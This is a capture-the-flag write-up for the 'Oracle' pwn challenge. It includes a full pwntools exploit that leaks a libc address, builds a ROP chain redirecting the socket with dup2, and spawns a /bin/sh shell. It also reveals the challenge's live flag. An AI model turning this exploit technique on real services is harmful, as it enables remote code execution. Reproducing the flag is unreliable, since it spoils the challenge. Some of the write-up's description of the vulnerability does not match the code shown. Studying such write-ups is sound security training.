# Cyber Apocalypse 2024

# Oracle | hard | pwn

> Traversing through the desert, you come across an Oracle. One of five in the entire arena, an oracle gives you the power to watch over the other competitors and send infinitely customizable plagues upon them. Deeming their powers to be too strong, the sadistic overlords that run the contest decided long ago that every oracle can backfire - and, if it does, you will wish a thousand times over that you had never been born. Willing to do whatever it takes, you break it open, risking eternal damnation for a chance to turn the tides in your favour.

## Enumeration

Download the given archive, extract, and let's dig inside. 

```
-rwxrw-rw-  1 kali kali   92 Feb  2 09:53 build_docker.sh
drwxr-xr-x  2 kali kali 4096 Mar 15 18:38 challenge
-rwxrw-rw-  1 kali kali  158 Feb  2 09:52 Dockerfile
-rwxrw-rw-  1 kali kali 7278 Feb 13 05:34 oracle.c
```

Let's analyze what happens inside the `Dockerfile` first and then we can check the source code.

```bash
└─$ cat Dockerfile                   
FROM ubuntu:20.04

RUN useradd -m ctf

COPY challenge/* /home/ctf/

RUN chown -R ctf:ctf /home/ctf/

WORKDIR /home/ctf
USER ctf

EXPOSE 9001
CMD ["./run.sh"]
```

Check the securities of the binary since we want to know what we're facing in a pwn challenge.

```bash
└─$ checksec oracle  
[*] '/home/kali/htb_stuffz/ctf_2024/pwn_oracle/challenge/oracle'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Explaining one-by-one what we can identify here. `Partial RELRO` means that some parts of the binary are marked as read-only after relocation to prevent overwriting of certain sections of the binary. However, this is not that much of a problem since it doesn't protect the `GOT` (Global Offset Table) as the Full RELRO does. Stack canaries are not being used, making it easier to perform buffer overflow attacks without detections. No eXecute enabled means that pages marked as non-executable cannot be executed, which is a mitigation against executing shellcode placed on the stack or heap. Return-Oriented Programming (ROP) is a technique that can be used in these situations to bypass. PIE means the executable's code is loaded at a random base address, which is a form of ASLR at the binary level, making it more difficult to predict the address of specific functions or gadgets. In order to confirm this, we're going to check ASLR status.

Hop into the local docker. This is assuming you've run the `./build_docker.sh`. Find out your container ID by running `docker ps`.

```bash
└─$ docker ps
CONTAINER ID   IMAGE     COMMAND      CREATED       STATUS       PORTS                                       NAMES
19dbe483fb3f   oracle    "./run.sh"   2 hours ago   Up 2 hours   0.0.0.0:9001->9001/tcp, :::9001->9001/tcp   oracle

└─$ docker exec -t -i oracle /bin/bash
ctf@19dbe483fb3f:~$ cat /proc/sys/kernel/randomize_va_space
2
```

A value of `0` means ASLR is disabled, `1` means it's partially enabled (conservative randomization), and `2` or higher typically indicates full ASLR is enabled. The use of `PIE` with the `oracle` binary, as indicated by the `checksec` output, aligns with ASLR by ensuring that the binary's code is loaded at a random base address each time it's executed. This randomization makes it significantly more difficult to predict where code might execute, complicating exploits that rely on hardcoded or guessed memory addresses, such as those used in buffer overflow attacks.

It's pretty satisfying that we are provided with the entire source code without being required to reverse the binary. Looking into the `oracle.c` we can almost immediately identify the vulnerabilities. 

The first and most obvious vulnerability that we will exploit is leaking the `libc`. This is possible due to the `handle_plague` function. This initial vulnerability within `handle_plague` arises from insufficient validation of user-supplied input, leading to a heap-based buffer overflow. This vulnerability is going to be the entry point for our exploit, allowing both the leakage of libc addresses and the injection of the ROP chain.

Below we can see where the problem arises: the function dynamically allocates a buffer on the heap to store data received from client based on the Content-Length header. However, it fails to properly validate the size of this incoming data against the allocated buffer's capacity. This is a buffer overflow condition. Leaking arbitrary memory locations, such as libc addresses, undermines the ASLR, and provides us with the critical piece of the puzzle to construct the ROP chain. Right from the `oracle.c` code, the `handle_plague` function:

```c
void handle_plague() {
    if(!get_header("Content-Length")) {
        write(client_socket, CONTENT_LENGTH_NEEDED, strlen(CONTENT_LENGTH_NEEDED));
        return;
    }

    // take in the data
    char *plague_content = (char *)malloc(MAX_PLAGUE_CONTENT_SIZE);
    char *plague_target = (char *)0x0;

    if (get_header("Plague-Target")) {
        plague_target = (char *)malloc(0x40);
        strncpy(plague_target, get_header("Plague-Target"), 0x1f);
    } else {
        write(client_socket, RANDOMISING_TARGET, strlen(RANDOMISING_TARGET));
    }

    long len = strtoul(get_header("Content-Length"), NULL, 10);

    if (len >= MAX_PLAGUE_CONTENT_SIZE) {
        len = MAX_PLAGUE_CONTENT_SIZE-1;
    }

    recv(client_socket, plague_content, len, 0);

    if(!strcmp(target_competitor, "me")) {
        write(client_socket, PLAGUING_YOURSELF, strlen(PLAGUING_YOURSELF));
    } else if (!is_competitor(target_competitor)) {
        write(client_socket, PLAGUING_OVERLORD, strlen(PLAGUING_OVERLORD));
    } else { 
        dprintf(client_socket, NO_COMPETITOR, target_competitor);

        if (len) {
            write(client_socket, plague_content, len);
            write(client_socket, "\n", 1);
        }
    }

    free(plague_content);

    if (plague_target) {
        free(plague_target);
    }
}
```

This is why we are going to approach this as a libc leak challenge. Our plan of attack is ROP gadgets to effectively navigate ASLR and PIE. First let's leak the libc address.

In networked exploits, unlike in local environments, we need to redirect the stdin/stdout of the process to the network socket to interact with the exploited service remotely. The `dup2` syscall achieves this by duplicating the socket's file descriptor (0x6 in this case) over stdin (0) and stdout (1). This redirection allows us to send commands and receive output over the network, tl;dr - enabling interactive access. This is what you will see when building up the payload for the ROP chain. 

Find below the entire code that does the job done. 

Run it without any arguments to execute it locally or run it with REMOTE argument to have it run remotely.

```python
#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./oracle')
context.log_level = 'error'

def get_connection():
    if args.REMOTE:
        return remote("94.237.54.170", 47106)
    else:
        return remote("localhost", 9001)

def plague(target_competitor: str, include_plague_target: bool, content_length: int = 1000) -> bytes:
    io = get_connection()
    io.send(b'PLAGUE ' + target_competitor.encode() + b' blah\r\n')
    io.send(b'Content-Length: ' + str(content_length).encode() + b'\r\n')
    if include_plague_target:
        io.send(b'Plague-Target: blah')
    io.send(b'\r\n\r\n')
    io.send(b'\x00') # null byte to indicate end of request
    data = io.recvline()
    if not include_plague_target:
        data += io.recvline()
        data += io.recvline()
    io.close()
    return data

# exploitation to trigger the vulnerability
plague("blah", True)
data = plague("blah", False, content_length=64)

# processing the leaked address
leak = u64(data.split(b": ")[1][9:17])
leak = leak << 8
print(hex(leak))

# calculating addresses for functions and gadgets within libc
libc = ELF('./libc-2.31.so')
libc.address = leak - 2018048
system_addr = libc.symbols['system'] # address of 'system' function
pop_rdi = libc.address + 0x0000000000023b6a
pop_rsi = libc.address + 0x000000000002601f
ret = libc.address + 0x0000000000022679
binsh = next(libc.search(b'/bin/sh')) # address of '/bin/sh'
dup2 = libc.symbols['dup2'] # address of dup2 function

offset = 2127 # offset from start of the buffer to the return address on stack

# establish connection for payload delivery
io = get_connection()
io.send(b'VIEW me 1.0\r\n')

# ROP chain payload
payload = flat(
    b'A' * offset,      # overflow the buffer to the return address
    pop_rdi,            # pop next value into RDI
    0x6,                # argument for dup2 file descriptor
    pop_rsi,
    0x0,
    dup2,               # call dup2 to duplicate file descriptor
    pop_rdi,
    0x6,                # repeat for stdout
    pop_rsi,
    0x1,
    dup2,               # duplicate file descriptor again
    pop_rdi,
    binsh,              # prepare the shell as argument for system
    ret,                # ensuring stack alignement
    system_addr         # call system("/bin/sh") to spawn
)

# send the crafted payload
io.send(payload + b'\r\n\r\n')
io.interactive()
io.close()
```

```
[*] '/ctf_2024/pwn_oracle/challenge/oracle'
<redacted>
0x7fceacf7fb00
You have found yourself.

$ cat flag.txt
HTB{f4k3_fL4G_f0R_t3sTiNg}
```

Finally, we can run our script on the remote, achieve shell, and grab the flag.

![image](https://github.com/respawnRW/writeups/assets/163560495/140d98ba-573a-4f4c-8ad3-acca9e760011)

The "live" flag in plaintext: `HTB{wH4t_d1D_tH3_oRAcL3_s4y_tO_tH3_f1gHt3r?}`

Hope you enjoyed.

Over and out,

`--RW`
